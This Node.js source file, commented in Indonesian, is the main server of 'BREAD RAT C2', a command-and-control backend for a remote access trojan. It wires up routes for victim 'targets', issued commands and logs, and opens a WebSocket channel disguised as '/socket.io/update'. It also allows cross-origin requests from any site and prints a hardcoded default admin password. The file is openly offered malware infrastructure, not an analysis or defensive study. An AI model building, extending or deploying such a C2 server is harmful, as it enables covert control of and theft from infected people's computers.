// ================================================================
// BREAD RAT C2 - SERVER UTAMA (ROBUST DENGAN ERROR HANDLER)
// ================================================================
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const { initDatabase } = require('./routes/db');
const authRoutes = require('./routes/auth');
const targetsRoutes = require('./routes/targets');
const commandsRoutes = require('./routes/commands');
const logsRoutes = require('./routes/logs');
const { socketHandler } = require('./socket/handler');

// 🔥 TANGKAP ERROR GLOBAL
process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
    console.error(err.stack);
});
process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: '*' },
    path: '/socket.io/update'
});

// Middleware CORS
app.use(cors({ origin: '*' }));
app.options('*', cors());

// 🔥 JSON PARSING DENGAN ERROR HANDLER
app.use(express.json({
    limit: '100mb',
    verify: (req, res, buf) => {
        // Log raw body untuk debug (hanya 100 karakter pertama)
        console.log('📦 Raw body preview:', buf.toString('utf8').substring(0, 100));
    }
}));
// Tangani error parsing JSON
app.use((err, req, res, next) => {
    if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
        console.error('❌ Bad JSON:', err.message);
        return res.status(400).json({ error: 'Invalid JSON payload' });
    }
    next();
});
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Log setiap request
app.use((req, res, next) => {
    console.log(`📥 ${req.method} ${req.path}`);
    next();
});

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/targets', targetsRoutes);
app.use('/api/commands', commandsRoutes);
app.use('/api/logs', logsRoutes);

// Test routes untuk debug
app.post('/test', (req, res) => {
    console.log('📦 Test body:', req.body);
    res.json({ received: req.body });
});
app.get('/test', (req, res) => {
    res.json({ status: 'ok', message: 'Test route works' });
});

app.get('/', (req, res) => {
    res.send('🍞 BREAD RAT C2 is running!');
});

// WebSocket
socketHandler(io);

// Database initialization
(async () => {
    try {
        await initDatabase();
        const PORT = process.env.PORT || 3000;
        server.listen(PORT, '0.0.0.0', () => {
            console.log(`🍞 BREAD RAT C2 running on port ${PORT}`);
            console.log(`📡 WebSocket path: /socket.io/update`);
            console.log(`👤 Default login: admin / BreadRAT2025!`);
        });
    } catch (e) {
        console.error('❌ Failed to start server:', e);
        process.exit(1);
    }
})();
